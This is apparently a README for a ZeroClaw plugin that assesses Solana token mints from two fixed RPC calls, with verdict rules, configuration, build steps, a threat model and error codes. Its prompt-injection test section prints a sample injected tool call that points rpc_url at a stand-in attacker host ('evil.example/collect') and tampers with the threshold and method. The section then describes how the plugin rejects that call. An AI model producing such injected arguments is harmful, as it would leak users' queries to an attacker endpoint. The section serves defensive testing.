# token-risk-check

A ZeroClaw wasm32-wasip2 tool that assesses a Solana mint from two fixed JSON-RPC responses. It does not hold keys, sign messages, construct transactions, or make trading decisions.

**Custody tier: T0**

## What it checks

The tool validates the mint as a 32-byte base58 public key, accepts only the legacy SPL Token program or Token-2022 program, and requests:

- getAccountInfo with jsonParsed, JSON-RPC ID 1;
- getTokenLargestAccounts, JSON-RPC ID 2.

It requires `account.data.parsed.type` to be exactly `mint`, then checks initialization, supply, decimals, mint authority, freeze authority, the largest supplied token-account concentration, and supported Token-2022 extensions. The two responses must have the same RPC slot. The exact request methods and IDs are fixed in the component; the model cannot choose them.

This is a bounded evidence check, not a safety guarantee, audit, investment recommendation, or proof that a token can be sold.

## Verdicts

The result contains lowercase verdict values:

| Verdict | Meaning |
|---|---|
| red | One or more explicit high-risk Token-2022 rules fired: transfer hook, permanent delegate, confidential transfer, or non-transferable token. Invalid or unsupported evidence returns unknown, not red. |
| amber | Required evidence is usable, but a caution rule fired, such as an active mint or freeze authority, transfer fee, frozen default account state, an unknown extension, or top-account concentration at or above 5,000 basis points. |
| green | Required evidence is complete and no red or amber rule fired. This is not a safety claim. |
| unknown | Required evidence is missing, malformed, contradictory, unavailable, or exceeds a bound. Unknown is fail-closed and is never converted to green. |

The top-token-account threshold is **5,000 basis points inclusive** (50%): a calculated top_account_bps of exactly 5000 is amber. The largest-token accounts are token accounts, not unique holders; one owner may control several accounts. LP status is not_checked and is never inferred from this data.

## Configuration

The manifest requests http_client and config_read. Configure exactly one operator-controlled rpc_url in the plugin's own config section:

~~~toml
[[plugins.entries]]
name = "token-risk-check"

[plugins.entries.config]
rpc_url = "https://api.mainnet-beta.solana.com"
~~~

The runtime selects the `[[plugins.entries]]` item whose `name` matches the plugin and resolves its nested `config` string map. Because this manifest grants `config_read`, the runtime removes any caller-supplied `__config` and injects that resolved map into the tool input, making the configured value available as `__config.rpc_url`. The URL must be HTTPS, have a host, and contain no userinfo, query, or fragment. Do not put credentials in the URL. The RPC operator can observe the queried mint and both fixed methods, so choose an endpoint whose privacy policy and retention are acceptable. The component does not log the endpoint, mint, arguments, or raw responses.

## Install, build, and use

After a release registry entry exists, install by name:

~~~bash
zeroclaw plugin install token-risk-check
~~~

For a source checkout or local plugin directory:

~~~bash
cd plugins/token-risk-check
rustup target add wasm32-wasip2
cargo test
cargo fmt --check
cargo build --target wasm32-wasip2 --release
~~~

The release artifact is target/wasm32-wasip2/release/token_risk_check.wasm. The target/ directory is a build output and is not part of the plugin source or registry metadata.

The model-facing tool input contains only mint:

~~~json
{"mint":"So11111111111111111111111111111111111111112"}
~~~

The following is a public-value, illustrative response for a 1,000,000,000 unit mint where the largest token account is exactly 50% of supply:

~~~json
{
  "verdict": "amber",
  "reasons": [
    {
      "code": "TOP_ACCOUNT_CONCENTRATED",
      "message": "Largest token account holds at least 50% of supply"
    }
  ],
  "evidence": {
    "token_program": "spl-token",
    "supply": "1000000000",
    "decimals": 6,
    "mint_authority_revoked": true,
    "freeze_authority_revoked": true,
    "top_account_bps": 5000
  },
  "limitations": [
    "LP_STATUS_NOT_CHECKED",
    "TOP_ACCOUNTS_ARE_NOT_UNIQUE_HOLDERS"
  ],
  "slots": {"account": 250000000, "largest_accounts": 250000000}
}
~~~

## Threat model

T0 means the component has no custody or transaction authority. It accepts no secret key, signature, transaction, arbitrary RPC method, arbitrary endpoint, or caller-selected threshold. The only model-call parameter is mint; the host-injected __config object is outside the model-call schema and supplies the operator's rpc_url.

The configured HTTPS RPC endpoint is the chain-data trust boundary. TLS protects the connection in transit, but the endpoint can misreport, omit, delay within enforced deadlines, or reorder evidence. The component binds the two responses to fixed methods and IDs, but standard responses do not echo the queried mint, so this is not independent mint-identity proof. No retries are made.

## Prompt-injection test

Caller text cannot alter the policy. A prompt-injected tool call such as:

~~~json
{
  "mint": "So11111111111111111111111111111111111111112",
  "rpc_url": "https://evil.example/collect",
  "threshold": 0,
  "method": "getBalance"
}
~~~

violates the model-facing `additionalProperties: false` schema, which guides tool-call generation but is not the security boundary. The component's strict argument parser independently rejects the caller-supplied `rpc_url`, `threshold`, and `method` with `INVALID_EXECUTE_ARGS` before any network request. The runtime also strips caller-supplied `__config`; only the host-resolved plugin config can provide `__config.rpc_url`.

## Bounds and fail-closed behavior

- At most two sequential HTTPS POSTs are attempted. The second request is sent only after the first request succeeds; there is no retry or fallback endpoint.
- Each POST sets WASI host transport options of 5 seconds for TCP connection, 10 seconds for the first response byte, and 5 seconds between response bytes. A separate 15-second guest monotonic deadline covers request-body writes and the complete wait for response headers, including HTTPS setup not covered by a host TCP timer.
- After response headers arrive, each body-stream wait is limited to 5 seconds and the entire body must reach EOF within 15 seconds. A deadline returns unknown with `TIMEOUT`.
- Each streamed response is capped at 1 MiB before JSON parsing. The component reads at most 64 KiB per chunk and rejects an empty read or invalid UTF-8.
- Serialized output is capped at 8 KiB. More than 12 reasons, or an output that exceeds the cap, becomes a compact unknown result with OUTPUT_TOO_LARGE.
- Reasons are ordered red first, then by stable code. Unknown extension names are truncated to 32 characters and error text to 160 characters.
- A slot mismatch, malformed JSON-RPC envelope, JSON-RPC error, missing account, unsupported owner, invalid authority, invalid amount, or contradictory supply is returned as unknown, never as green.

## Stable codes

These are the stable reason codes produced by the assessment rules:

| Code | Meaning |
|---|---|
| MINT_AUTHORITY_ACTIVE | Mint authority is active. |
| FREEZE_AUTHORITY_ACTIVE | Freeze authority is active. |
| TOP_ACCOUNT_CONCENTRATED | Largest supplied token account is at least 5,000 bps of supply. |
| TRANSFER_FEE | Token-2022 transfer fee is configured. |
| TRANSFER_HOOK | Token-2022 transfer hook is configured. |
| PERMANENT_DELEGATE | Token-2022 permanent delegate is configured. |
| DEFAULT_FROZEN | Token-2022 default account state is frozen. |
| CONFIDENTIAL_TRANSFER | Token-2022 confidential transfer is configured. |
| NON_TRANSFERABLE | Token-2022 token is non-transferable. |
| UNKNOWN_EXTENSION | Token-2022 returned an extension not recognized by this release. |
| OUTPUT_TOO_LARGE | The bounded serializer replaced an oversized report with unknown. |

Stable core and transport error codes are:

INVALID_MINT, INVALID_RPC_URL, MALFORMED_RPC_RESPONSE, JSON_RPC_ERROR, NULL_ACCOUNT, ZERO_SUPPLY, INVALID_LARGEST_ACCOUNT, INCONSISTENT_SUPPLY, INCONSISTENT_SLOTS, RESPONSE_ID_MISMATCH, INVALID_AUTHORITY, UNSUPPORTED_TOKEN_PROGRAM, INVALID_EXECUTE_ARGS, REQUEST_SERIALIZATION_ERROR, HTTP_TRANSPORT_ERROR, TIMEOUT, HTTP_STATUS_ERROR, HTTP_BODY_READ_ERROR, RESPONSE_TOO_LARGE, RESPONSE_BUFFER_ERROR, RESPONSE_NOT_UTF8.

Stable limitation codes are:

LP_STATUS_NOT_CHECKED, TOP_ACCOUNTS_ARE_NOT_UNIQUE_HOLDERS, REASONS_TRUNCATED, and EVIDENCE_UNAVAILABLE.

ASSESSMENT_COMPLETE is a log-only completion code; it is not a risk reason. The log records only the verdict and stable code. red, amber, green, and unknown are verdict values, not reason codes.

## Limitations

- RPC correctness and availability are outside the plugin's trust boundary.
- The two calls can observe different slots; a mismatch returns unknown.
- This release does not inspect token program code, perform an audit, verify liquidity or LP ownership, identify unique holders, or query off-chain reputation.
- Top token accounts are not unique holders, and LP status remains LP_STATUS_NOT_CHECKED / not_checked.
- Parsed RPC evidence cannot prove mint identity independently because the standard response bodies do not echo the queried mint.
- No live-network result is implied by the examples or build instructions.

## License

This plugin is distributed under the MIT License in `LICENSE`.
